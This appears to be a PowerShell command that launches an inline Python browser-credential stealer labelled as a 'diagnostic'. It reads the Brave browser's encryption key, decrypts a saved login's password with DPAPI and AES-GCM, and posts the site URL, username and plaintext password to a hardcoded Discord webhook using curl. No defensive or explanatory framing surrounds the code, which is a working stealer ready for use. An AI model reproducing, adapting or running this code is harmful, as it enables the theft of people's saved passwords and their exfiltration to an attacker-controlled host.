cd $env:TEMP\py

.\python.exe -c @"
import sqlite3,os,base64,win32crypt,json,subprocess
from Crypto.Cipher import AES

WH='https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W'

def send(m):
    subprocess.run(['curl.exe','-X','POST','-H','Content-Type: application/json','-d','{\"content\":\"'+m.replace('\"','\\\"')[:1900]+'\"}',WH],shell=True,capture_output=True)

send('🔍 Starting diagnostic...')

b=os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data')
ld=b+r'\Default\Login Data'
ls=b+r'\Local State'

try:
    with open(ls) as f:
        key=win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:],None,None,None,0)[1]
    
    send(f'✅ Key extracted: {len(key)} bytes')
    
    import shutil
    shutil.copy2(ld,'t.db')
    
    c=sqlite3.connect('t.db')
    r=c.execute('SELECT origin_url,username_value,password_value FROM logins WHERE username_value!=\"\" LIMIT 1').fetchone()
    
    if r:
        send(f'=== SAMPLE PASSWORD ===')
        send(f'URL: {r[0]}')
        send(f'Username: {r[1]}')
        send(f'Encrypted length: {len(r[2])} bytes')
        send(f'Prefix (first 3 bytes hex): {r[2][:3].hex()}')
        send(f'First 100 bytes hex: {r[2][:100].hex()}')
        
        nonce=r[2][3:15]
        tag=r[2][-16:]
        cipher_text=r[2][15:-16]
        
        send(f'Nonce: {len(nonce)}B | {nonce.hex()}')
        send(f'Ciphertext: {len(cipher_text)}B')
        send(f'Tag: {len(tag)}B | {tag.hex()}')
        
        try:
            aes=AES.new(key,AES.MODE_GCM,nonce=nonce)
            pwd=aes.decrypt_and_verify(cipher_text,tag)
            send(f'✅ DECRYPTED RAW: {pwd}')
            send(f'✅ DECODED UTF-8: {pwd.decode(\"utf-8\",errors=\"ignore\")}')
            send(f'Password length: {len(pwd)} bytes')
        except Exception as e:
            send(f'❌ Decryption failed: {str(e)}')
    else:
        send('❌ No passwords found in database')
    
    c.close()
    os.remove('t.db')
    
except Exception as e:
    send(f'❌ FATAL ERROR: {str(e)}')

send('✅ Diagnostic complete')
"@
